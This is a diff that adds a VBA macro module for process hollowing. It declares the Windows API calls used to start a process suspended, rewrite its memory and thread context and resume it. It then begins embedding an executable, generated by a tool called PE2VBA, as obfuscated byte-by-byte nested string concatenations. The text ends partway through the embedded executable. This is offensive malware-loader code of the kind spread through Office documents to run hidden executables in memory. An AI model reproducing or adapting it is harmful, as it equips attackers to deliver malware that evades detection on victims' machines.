@@ -1,0 +1,1343 @@
+
+
+Option Explicit
+
+' ================================================================================
+'                      ~~~ IMPORT WINDOWS API FUNCTIONS ~~~
+' ================================================================================
+#If Win64 Then
+    Private Declare PtrSafe Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByVal sSource As LongPtr, ByVal lLength As Long)
+    Private Declare PtrSafe Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As LongPtr, ByVal lpFilename As String, ByVal nSize As Long) As Long
+    Private Declare PtrSafe Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+    Private Declare PtrSafe Function GetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, ByVal lpContext As LongPtr) As Long
+    Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As LongPtr) As Long
+    Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare PtrSafe Function VirtualFree Lib "KERNEL32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
+    Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
+    Private Declare PtrSafe Function SetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, ByVal lpContext As LongPtr) As Long
+    Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
+    Private Declare PtrSafe Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal uExitCode As Integer) As Long
+#Else
+    Private Declare Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As Long, ByVal sSource As Long, ByVal lLength As Long)
+    Private Declare Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFilename As String, ByVal nSize As Long) As Long
+    Private Declare Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+    Private Declare Function GetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
+    Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As LongPtr) As Long
+    Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare Function VirtualFree Lib "KERNEL32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
+    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
+    Private Declare Function SetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
+    Private Declare Function ResumeThread Lib "KERNEL32" (ByVal hThread As Long) As Long
+    Private Declare Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As Long, ByVal uExitCode As Integer) As Long
+#End If
+
+
+' ================================================================================
+'                           ~~~ WINDOWS STRUCTURES ~~~
+' ================================================================================
+' Constants used in structure definitions
+Private Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
+Private Const IMAGE_SIZEOF_SHORT_NAME = 8
+Private Const MAXIMUM_SUPPORTED_EXTENSION = 512
+Private Const SIZE_OF_80387_REGISTERS = 80
+
+#If Win64 Then
+    Private Type M128A
+        Low As LongLong     'ULONGLONG Low;
+        High As LongLong    'LONGLONG High;
+    End Type
+#End If
+
+' https://www.nirsoft.net/kernel_struct/vista/IMAGE_DOS_HEADER.html
+Private Type IMAGE_DOS_HEADER
+     e_magic As Integer         'WORD e_magic;
+     e_cblp As Integer          'WORD e_cblp;
+     e_cp As Integer            'WORD e_cp;
+     e_crlc As Integer          'WORD e_crlc;
+     e_cparhdr As Integer       'WORD e_cparhdr;
+     e_minalloc As Integer      'WORD e_minalloc;
+     e_maxalloc As Integer      'WORD e_maxalloc;
+     e_ss As Integer            'WORD e_ss;
+     e_sp As Integer            'WORD e_sp;
+     e_csum As Integer          'WORD e_csum;
+     e_ip As Integer            'WORD e_ip;
+     e_cs As Integer            'WORD e_cs;
+     e_lfarlc As Integer        'WORD e_lfarlc;
+     e_ovno As Integer          'WORD e_ovno;
+     e_res(4 - 1) As Integer    'WORD e_res[4];
+     e_oemid As Integer         'WORD e_oemid;
+     e_oeminfo As Integer       'WORD e_oeminfo;
+     e_res2(10 - 1) As Integer  'WORD e_res2[10];
+     e_lfanew As Long           'LONG e_lfanew;
+End Type
+
+' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680305(v=vs.85).aspx
+Private Type IMAGE_DATA_DIRECTORY
+    VirtualAddress As Long      'DWORD   VirtualAddress;
+    Size As Long                'DWORD   Size;
+End Type
+
+' undocumented
+Private Type IMAGE_BASE_RELOCATION
+    VirtualAddress As Long        'DWORD   VirtualAddress
+    SizeOfBlock As Long           'DWORD   SizeOfBlock
+End Type
+
+' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680313(v=vs.85).aspx
+Private Type IMAGE_FILE_HEADER
+    Machine As Integer                  'WORD    Machine;
+    NumberOfSections As Integer         'WORD    NumberOfSections;
+    TimeDateStamp As Long               'DWORD   TimeDateStamp;
+    PointerToSymbolTable As Long        'DWORD   PointerToSymbolTable;
+    NumberOfSymbols As Long             'DWORD   NumberOfSymbols;
+    SizeOfOptionalHeader As Integer     'WORD    SizeOfOptionalHeader;
+    Characteristics As Integer          'WORD    Characteristics;
+End Type
+
+' https://msdn.microsoft.com/en-us/library/windows/desktop/ms680339(v=vs.85).aspx
+Private Type IMAGE_OPTIONAL_HEADER
+    #If Win64 Then
+        Magic As Integer                        'WORD        Magic;
+        MajorLinkerVersion As Byte              'BYTE        MajorLinkerVersion;
+        MinorLinkerVersion As Byte              'BYTE        MinorLinkerVersion;
+        SizeOfCode As Long                      'DWORD       SizeOfCode;
+        SizeOfInitializedData As Long           'DWORD       SizeOfInitializedData;
+        SizeOfUninitializedData As Long         'DWORD       SizeOfUninitializedData;
+        AddressOfEntryPoint As Long             'DWORD       AddressOfEntryPoint;
+        BaseOfCode As Long                      'DWORD       BaseOfCode;
+        ImageBase As LongLong                   'ULONGLONG   ImageBase;
+        SectionAlignment As Long                'DWORD       SectionAlignment;
+        FileAlignment As Long                   'DWORD       FileAlignment;
+        MajorOperatingSystemVersion As Integer  'WORD        MajorOperatingSystemVersion;
+        MinorOperatingSystemVersion As Integer  'WORD        MinorOperatingSystemVersion;
+        MajorImageVersion As Integer            'WORD        MajorImageVersion;
+        MinorImageVersion As Integer            'WORD        MinorImageVersion;
+        MajorSubsystemVersion As Integer        'WORD        MajorSubsystemVersion;
+        MinorSubsystemVersion As Integer        'WORD        MinorSubsystemVersion;
+        Win32VersionValue As Long               'DWORD       Win32VersionValue;
+        SizeOfImage As Long                     'DWORD       SizeOfImage;
+        SizeOfHeaders As Long                   'DWORD       SizeOfHeaders;
+        CheckSum As Long                        'DWORD       CheckSum;
+        Subsystem As Integer                    'WORD        Subsystem;
+        DllCharacteristics As Integer           'WORD        DllCharacteristics;
+        SizeOfStackReserve As LongLong          'ULONGLONG   SizeOfStackReserve;
+        SizeOfStackCommit As LongLong           'ULONGLONG   SizeOfStackCommit;
+        SizeOfHeapReserve As LongLong           'ULONGLONG   SizeOfHeapReserve;
+        SizeOfHeapCommit As LongLong            'ULONGLONG   SizeOfHeapCommit;
+        LoaderFlags As Long                     'DWORD       LoaderFlags;
+        NumberOfRvaAndSizes As Long             'DWORD       NumberOfRvaAndSizes;
+        DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY 'IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
+    #Else
+        Magic As Integer                        'WORD    Magic;
+        MajorLinkerVersion As Byte              'BYTE    MajorLinkerVersion;
+        MinorLinkerVersion As Byte              'BYTE    MinorLinkerVersion;
+        SizeOfCode As Long                      'DWORD   SizeOfCode;
+        SizeOfInitializedData As Long           'DWORD   SizeOfInitializedData;
+        SizeOfUninitializedData As Long         'DWORD   SizeOfUninitializedData;
+        AddressOfEntryPoint As Long             'DWORD   AddressOfEntryPoint;
+        BaseOfCode As Long                      'DWORD   BaseOfCode;
+        BaseOfData As Long                      'DWORD   BaseOfData;
+        ImageBase As Long                       'DWORD   ImageBase;
+        SectionAlignment As Long                'DWORD   SectionAlignment;
+        FileAlignment As Long                   'DWORD   FileAlignment;
+        MajorOperatingSystemVersion As Integer  'WORD    MajorOperatingSystemVersion;
+        MinorOperatingSystemVersion As Integer  'WORD    MinorOperatingSystemVersion;
+        MajorImageVersion As Integer            'WORD    MajorImageVersion;
+        MinorImageVersion As Integer            'WORD    MinorImageVersion;
+        MajorSubsystemVersion As Integer        'WORD    MajorSubsystemVersion;
+        MinorSubsystemVersion As Integer        'WORD    MinorSubsystemVersion;
+        Win32VersionValue As Long               'DWORD   Win32VersionValue;
+        SizeOfImage As Long                     'DWORD   SizeOfImage;
+        SizeOfHeaders As Long                   'DWORD   SizeOfHeaders;
+        CheckSum As Long                        'DWORD   CheckSum;
+        Subsystem As Integer                    'WORD    Subsystem;
+        DllCharacteristics As Integer           'WORD    DllCharacteristics;
+        SizeOfStackReserve As Long              'DWORD   SizeOfStackReserve;
+        SizeOfStackCommit As Long               'DWORD   SizeOfStackCommit;
+        SizeOfHeapReserve As Long               'DWORD   SizeOfHeapReserve;
+        SizeOfHeapCommit As Long                'DWORD   SizeOfHeapCommit;
+        LoaderFlags As Long                     'DWORD   LoaderFlags;
+        NumberOfRvaAndSizes As Long             'DWORD   NumberOfRvaAndSizes;
+        DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY 'IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
+    #End If
+End Type
+
+' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680336(v=vs.85).aspx
+Private Type IMAGE_NT_HEADERS
+    Signature As Long                         'DWORD Signature;
+    FileHeader As IMAGE_FILE_HEADER           'IMAGE_FILE_HEADER FileHeader;
+    OptionalHeader As IMAGE_OPTIONAL_HEADER   'IMAGE_OPTIONAL_HEADER OptionalHeader;
+End Type
+
+' https://www.nirsoft.net/kernel_struct/vista/IMAGE_SECTION_HEADER.html
+Private Type IMAGE_SECTION_HEADER
+    SecName(IMAGE_SIZEOF_SHORT_NAME - 1) As Byte 'UCHAR Name[IMAGE_SIZEOF_SHORT_NAME];
+    Misc As Long                    'ULONG Misc;
+    VirtualAddress As Long          'ULONG VirtualAddress;
+    SizeOfRawData As Long           'ULONG SizeOfRawData;
+    PointerToRawData As Long        'ULONG PointerToRawData;
+    PointerToRelocations As Long    'ULONG PointerToRelocations;
+    PointerToLinenumbers As Long    'ULONG PointerToLinenumbers;
+    NumberOfRelocations As Integer  'WORD  NumberOfRelocations;
+    NumberOfLinenumbers As Integer  'WORD  NumberOfLinenumbers;
+    Characteristics As Long         'ULONG Characteristics;
+End Type
+
+' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms684873(v=vs.85).aspx
+Private Type PROCESS_INFORMATION
+    hProcess As LongPtr     'HANDLE hProcess;
+    hThread As LongPtr      'HANDLE hThread;
+    dwProcessId As Long     'DWORD  dwProcessId;
+    dwThreadId As Long      'DWORD  dwThreadId;
+End Type
+
+' https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx
+Private Type STARTUPINFO
+    cb As Long                  'DWORD  cb;
+    lpReserved As String        'LPSTR  lpReserved;
+    lpDesktop As String         'LPSTR  lpDesktop;
+    lpTitle As String           'LPSTR  lpTitle;
+    dwX As Long                 'DWORD  dwX;
+    dwY As Long                 'DWORD  dwY;
+    dwXSize As Long             'DWORD  dwXSize;
+    dwYSize As Long             'DWORD  dwYSize;
+    dwXCountChars As Long       'DWORD  dwXCountChars;
+    dwYCountChars As Long       'DWORD  dwYCountChars;
+    dwFillAttribute As Long     'DWORD  dwFillAttribute;
+    dwFlags As Long             'DWORD  dwFlags;
+    wShowWindow As Integer      'WORD   wShowWindow;
+    cbReserved2 As Integer      'WORD   cbReserved2;
+    lpReserved2 As LongPtr      'LPBYTE lpReserved2;
+    hStdInput As LongPtr        'HANDLE hStdInput;
+    hStdOutput As LongPtr       'HANDLE hStdOutput;
+    hStdError As LongPtr        'HANDLE hStdError;
+End Type
+
+' https://www.nirsoft.net/kernel_struct/vista/FLOATING_SAVE_AREA.html
+Private Type FLOATING_SAVE_AREA
+    ControlWord As Long                                 'DWORD ControlWord;
+    StatusWord As Long                                  'DWORD StatusWord;
+    TagWord As Long                                     'DWORD TagWord;
+    ErrorOffset As Long                                 'DWORD ErrorOffset;
+    ErrorSelector As Long                               'DWORD ErrorSelector;
+    DataOffset As Long                                  'DWORD DataOffset;
+    DataSelector As Long                                'DWORD DataSelector;
+    RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte   'BYTE  RegisterArea[SIZE_OF_80387_REGISTERS];
+    Spare0 As Long                                      'DWORD Spare0;
+End Type
+
+' winnt.h
+#If Win64 Then
+    Private Type XMM_SAVE_AREA32
+        ControlWord As Integer                  'WORD  ControlWord;
+        StatusWord As Integer                   'WORD  StatusWord;
+        TagWord As Byte                         'BYTE  TagWord;
+        Reserved1 As Byte                       'BYTE  Reserved1;
+        ErrorOpcode As Integer                  'WORD  ErrorOpcode;
+        ErrorOffset As Long                     'DWORD ErrorOffset;
+        ErrorSelector As Integer                'WORD  ErrorSelector;
+        Reserved2 As Integer                    'WORD  Reserved2;
+        DataOffset As Long                      'DWORD DataOffset;
+        DataSelector As Integer                 'WORD  DataSelector;
+        Reserved3 As Integer                    'WORD  Reserved3;
+        MxCsr As Long                           'DWORD MxCsr;
+        MxCsr_Mask As Long                      'DWORD MxCsr_Mask;
+        FloatRegisters(8 - 1) As M128A          'M128A FloatRegisters[8];
+        XmmRegisters(16 - 1) As M128A       'M128A XmmRegisters[16];
+        Reserved4(96 - 1) As Byte           'BYTE  Reserved4[96];
+End Type
+#End If
+
+Private Type CONTEXT
+    #If Win64 Then
+        ' Register parameter home addresses
+        P1Home As LongLong                  'DWORD64 P1Home;
+        P2Home As LongLong                  'DWORD64 P2Home;
+        P3Home As LongLong                  'DWORD64 P3Home;
+        P4Home As LongLong                  'DWORD64 P4Home;
+        P5Home As LongLong                  'DWORD64 P5Home;
+        P6Home As LongLong                  'DWORD64 P6Home;
+        ' Control flags
+        ContextFlags As Long                'DWORD ContextFlags;
+        MxCsr As Long                       'DWORD MxCsr;
+        ' Segment Registers and processor flags
+        SegCs As Integer                    'WORD   SegCs;
+        SegDs As Integer                    'WORD   SegDs;
+        SegEs As Integer                    'WORD   SegEs;
+        SegFs As Integer                    'WORD   SegFs;
+        SegGs As Integer                    'WORD   SegGs;
+        SegSs As Integer                    'WORD   SegSs;
+        EFlags As Long                      'DWORD  EFlags;
+        ' Debug registers
+        Dr0 As LongLong                     'DWORD64 Dr0;
+        Dr1 As LongLong                     'DWORD64 Dr1;
+        Dr2 As LongLong                     'DWORD64 Dr2;
+        Dr3 As LongLong                     'DWORD64 Dr3;
+        Dr6 As LongLong                     'DWORD64 Dr6;
+        Dr7 As LongLong                     'DWORD64 Dr7;
+        ' Integer registers
+        Rax As LongLong                     'DWORD64 Rax;
+        Rcx As LongLong                     'DWORD64 Rcx;
+        Rdx As LongLong                     'DWORD64 Rdx;
+        Rbx As LongLong                     'DWORD64 Rbx;
+        Rsp As LongLong                     'DWORD64 Rsp;
+        Rbp As LongLong                     'DWORD64 Rbp;
+        Rsi As LongLong                     'DWORD64 Rsi;
+        Rdi As LongLong                     'DWORD64 Rdi;
+        R8 As LongLong                      'DWORD64 R8;
+        R9 As LongLong                      'DWORD64 R9;
+        R10 As LongLong                     'DWORD64 R10;
+        R11 As LongLong                     'DWORD64 R11;
+        R12 As LongLong                     'DWORD64 R12;
+        R13 As LongLong                     'DWORD64 R13;
+        R14 As LongLong                     'DWORD64 R14;
+        R15 As LongLong                     'DWORD64 R15;
+        ' Program counter
+        Rip As LongLong                     'DWORD64 Rip
+        ' Floating point state
+        FltSave As XMM_SAVE_AREA32          'XMM_SAVE_AREA32 FltSave;
+        'Header(2 - 1) As M128A              'M128A Header[2];
+        'Legacy(8 - 1) As M128A              'M128A Legacy[8];
+        'Xmm0 As M128A                       'M128A Xmm0;
+        'Xmm1 As M128A                       'M128A Xmm1;
+        'Xmm2 As M128A                       'M128A Xmm2;
+        'Xmm3 As M128A                       'M128A Xmm3;
+        'Xmm4 As M128A                       'M128A Xmm4;
+        'Xmm5 As M128A                       'M128A Xmm5;
+        'Xmm6 As M128A                       'M128A Xmm6;
+        'Xmm7 As M128A                       'M128A Xmm7;
+        'Xmm8 As M128A                       'M128A Xmm8;
+        'Xmm9 As M128A                       'M128A Xmm9;
+        'Xmm10 As M128A                      'M128A Xmm10;
+        'Xmm11 As M128A                      'M128A Xmm11;
+        'Xmm12 As M128A                      'M128A Xmm12;
+        'Xmm13 As M128A                      'M128A Xmm13;
+        'Xmm14 As M128A                      'M128A Xmm14;
+        'Xmm15 As M128A                      'M128A Xmm15;
+        ' Vector registers
+        VectorRegister(26 - 1) As M128A     'M128A   VectorRegister[26];
+        VectorControl As LongLong           'DWORD64 VectorControl;
+        ' Special debug control registers
+        DebugControl As LongLong            'DWORD64 DebugControl;
+        LastBranchToRip As LongLong         'DWORD64 LastBranchToRip;
+        LastBranchFromRip As LongLong       'DWORD64 LastBranchFromRip;
+        LastExceptionToRip As LongLong      'DWORD64 LastExceptionToRip;
+        LastExceptionFromRip As LongLong    'DWORD64 LastExceptionFromRip;
+    #Else
+        ' https://msdn.microsoft.com/en-us/library/windows/desktop/ms679284(v=vs.85).aspx
+        ContextFlags As Long                'DWORD ContextFlags;
+        Dr0 As Long                         'DWORD Dr0;
+        Dr1 As Long                         'DWORD Dr1;
+        Dr2 As Long                         'DWORD Dr2;
+        Dr3 As Long                         'DWORD Dr3;
+        Dr6 As Long                         'DWORD Dr6;
+        Dr7 As Long                         'DWORD Dr7;
+        FloatSave As FLOATING_SAVE_AREA     'FLOATING_SAVE_AREA FloatSave;
+        SegGs As Long                       'DWORD SegGs;
+        SegFs As Long                       'DWORD SegFs;
+        SegEs As Long                       'DWORD SegEs;
+        SegDs As Long                       'DWORD SegDs;
+        Edi As Long                         'DWORD Edi;
+        Esi As Long                         'DWORD Esi;
+        Ebx As Long                         'DWORD Ebx;
+        Edx As Long                         'DWORD Edx;
+        Ecx As Long                         'DWORD Ecx;
+        Eax As Long                         'DWORD Eax;
+        Ebp As Long                         'DWORD Ebp;
+        Eip As Long                         'DWORD Eip;
+        SegCs As Long                       'DWORD SegCs;  // MUST BE SANITIZED
+        EFlags As Long                      'DWORD EFlags; // MUST BE SANITIZED
+        Esp As Long                         'DWORD Esp;
+        SegSs As Long                       'DWORD SegSs;
+        ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As Byte 'BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];
+    #End If
+End Type
+
+
+' ================================================================================
+'                   ~~~ CONSTANTS USED IN WINDOWS API CALLS ~~~
+' ================================================================================
+Private Const MEM_COMMIT = &H1000
+Private Const MEM_RESERVE = &H2000
+Private Const PAGE_READWRITE = &H4
+Private Const PAGE_EXECUTE_READWRITE = &H40
+Private Const MAX_PATH = 260
+Private Const CREATE_SUSPENDED = &H4
+
+Private Const CONTEXT_AMD64 = &H100000
+Private Const CONTEXT_I386 = &H10000
+#If Win64 Then
+    Private Const CONTEXT_ARCH = CONTEXT_AMD64
+#Else
+    Private Const CONTEXT_ARCH = CONTEXT_I386
+#End If
+Private Const CONTEXT_CONTROL = CONTEXT_ARCH Or &H1
+Private Const CONTEXT_INTEGER = CONTEXT_ARCH Or &H2
+Private Const CONTEXT_SEGMENTS = CONTEXT_ARCH Or &H4
+Private Const CONTEXT_FLOATING_POINT = CONTEXT_ARCH Or &H8
+Private Const CONTEXT_DEBUG_REGISTERS = CONTEXT_ARCH Or &H10
+Private Const CONTEXT_EXTENDED_REGISTERS = CONTEXT_ARCH Or &H20
+Private Const CONTEXT_FULL = CONTEXT_CONTROL Or CONTEXT_INTEGER Or CONTEXT_SEGMENTS
+
+
+' ================================================================================
+'                     ~~~ CONSTANTS USED IN THE MAIN SUB ~~~
+' ================================================================================
+Private Const VERBOSE = False                       ' Set to True for debugging
+Private Const IMAGE_DOS_SIGNATURE = &H5A4D          ' 0x5A4D      // MZ
+Private Const IMAGE_NT_SIGNATURE = &H4550           ' 0x00004550  // PE00
+Private Const IMAGE_FILE_MACHINE_I386 = &H14C       ' 32 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
+Private Const IMAGE_FILE_MACHINE_AMD64 = &H8664     ' 64 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
+Private Const SIZEOF_IMAGE_DOS_HEADER = 64
+Private Const SIZEOF_IMAGE_SECTION_HEADER = 40
+Private Const SIZEOF_IMAGE_FILE_HEADER = 20
+Private Const SIZEOF_IMAGE_DATA_DIRECTORY = 8
+Private Const SIZEOF_IMAGE_BASE_RELOCATION = 8
+Private Const SIZEOF_IMAGE_BASE_RELOCATION_ENTRY = 2
+#If Win64 Then
+    Private Const SIZEOF_IMAGE_NT_HEADERS = 264
+    Private Const SIZEOF_ADDRESS = 8
+#Else
+    Private Const SIZEOF_IMAGE_NT_HEADERS = 248
+    Private Const SIZEOF_ADDRESS = 4
+#End If
+
+' Data Directories
+' |__ IMAGE_OPTIONAL_HEADER contains an array of 16 IMAGE_DATA_DIRECTORY structures
+' |__ Each IMAGE_DATA_DIRECTORY structure as a "predefined role", as defined by these constants (in winnt.h)
+Private Const IMAGE_DIRECTORY_ENTRY_EXPORT = 0       ' Export Directory
+Private Const IMAGE_DIRECTORY_ENTRY_IMPORT = 1       ' Import Directory
+Private Const IMAGE_DIRECTORY_ENTRY_RESOURCE = 2     ' Resource Directory
+Private Const IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3    ' Exception Directory
+Private Const IMAGE_DIRECTORY_ENTRY_SECURITY = 4     ' Security Directory
+Private Const IMAGE_DIRECTORY_ENTRY_BASERELOC = 5    ' Base Relocation Table
+Private Const IMAGE_DIRECTORY_ENTRY_DEBUG = 6        ' Debug Directory
+Private Const IMAGE_DIRECTORY_ENTRY_COPYRIGHT = 7    ' Description String
+Private Const IMAGE_DIRECTORY_ENTRY_GLOBALPTR = 8    ' Machine Value (MIPS GP)
+Private Const IMAGE_DIRECTORY_ENTRY_TLS = 9          ' TLS Directory
+Private Const IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10 ' Load Configuration Directory
+
+
+' ================================================================================
+'                                ~~~ HELPERS ~~~
+' ================================================================================
+
+' --------------------------------------------------------------------------------
+' Method:    ByteArrayLength
+' Desc:      Returns the length of a Byte array
+' Arguments: baBytes - An array of Bytes
+' Returns:   The size of the array as a Long
+' --------------------------------------------------------------------------------
+Public Function ByteArrayLength(baBytes() As Byte) As Long
+    On Error Resume Next
+    ByteArrayLength = UBound(baBytes) - LBound(baBytes) + 1
+End Function
+
+' --------------------------------------------------------------------------------
+' Method:    ByteArrayToString
+' Desc:      Converts an array of Bytes to a String
+' Arguments: baBytes - An array of Bytes
+' Returns:   The String representation of the Byte array
+' --------------------------------------------------------------------------------
+Private Function ByteArrayToString(baBytes() As Byte) As String
+    Dim strRes As String: strRes = ""
+    Dim iCount As Integer
+    For iCount = 0 To ByteArrayLength(baBytes) - 1
+        If baBytes(iCount) <> 0 Then
+            strRes = strRes & Chr(baBytes(iCount))
+        Else
+            Exit For
+        End If
+    Next iCount
+    ByteArrayToString = strRes
+End Function
+
+' --------------------------------------------------------------------------------
+' Method:    FileToByteArray
+' Desc:      Reads a file as a Byte array
+' Arguments: strFilename - Fullname of the file as a String (ex:
+'                'C:\Windows\System32\cmd.exe')
+' Returns:   The content of the file as a Byte array
+' --------------------------------------------------------------------------------
+Private Function FileToByteArray(strFilename As String) As Byte()
+    ' File content to String
+    Dim strFileContent As String
+    Dim iFile As Integer: iFile = FreeFile
+    Open strFilename For Binary Access Read As #iFile
+        strFileContent = Space(FileLen(strFilename))
+        Get #iFile, , strFileContent
+    Close #iFile
+    
+    ' String to Byte array
+    Dim baFileContent() As Byte
+    baFileContent = StrConv(strFileContent, vbFromUnicode)
+
+    FileToByteArray = baFileContent
+End Function
+
+' --------------------------------------------------------------------------------
+' Method:    StringToByteArray
+' Desc:      Convert a String to a Byte array
+' Arguments: strContent - Input String representing the PE
+' Returns:   The content of the String as a Byte array
+' --------------------------------------------------------------------------------
+Private Function StringToByteArray(strContent As String) As Byte()
+    Dim baContent() As Byte
+    baContent = StrConv(strContent, vbFromUnicode)
+    StringToByteArray = baContent
+End Function
+
+' --------------------------------------------------------------------------------
+' Method:    A
+' Desc:      Append a Char to a String.
+' Arguments: strA - Input String. E.g.: "AAA"
+'            bChar - Input Char as a Byte. E.g.: 66 or &H42
+' Returns:   The concatenation of the String and the Char. E.g.: "AAAB"
+' --------------------------------------------------------------------------------
+Private Function A(strA As String, bChar As Byte) As String
+    A = strA & Chr(bChar)
+End Function
+
+' --------------------------------------------------------------------------------
+' Method:    B
+' Desc:      Append a String to another String.
+' Arguments: strA - Input String 1. E.g.: "AAAA"
+'            strB - Input String 2. E.g.: "BBBB"
+' Returns:   The concatenation of the two Strings. E.g.: "AAAABBBB"
+' --------------------------------------------------------------------------------
+Private Function B(strA As String, strB As String) As String
+    B = strA + strB
+End Function
+
+
+' ================================================================================
+'                                ~~~ EMBEDDED PE ~~~
+' ================================================================================
+
+' CODE GENERATED BY PE2VBA
+' ===== BEGIN PE2VBA =====
+Private Function PE0() As String
+   Dim strPE As String
+
+    strPE = ""
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "MZ"), 144), 0), 3), 0), 0), 0), 4), 0), 0), 0), 255), 255), 0), 0), 184), 0), 0), 0), 0), 0), 0), 0), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 128), 0), 0), 0), 14), 31), 186), 14), 0), 180), 9), 205), "!"), 184), 1), "L"), 205), "!This program cannot be")
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(strPE, " run in DOS mode."), 13), 13), 10), "$"), 0), 0), 0), 0), 0), 0), 0), "PE"), 0), 0), "L"), 1), 7), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 224), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(strPE, 15), 3), 11), 1), 2), " "), 0), 26), 0), 0), 0), "4"), 0), 0), 0), 6), 0), 0), 128), 20), 0), 0), 0), 16), 0), 0), 0), "0"), 0), 0), 0), 0), "@"), 0), 0), 16), 0), 0), 0), 2), 0), 0), 4), 0), 0), 0), 1), 0), 0), 0)
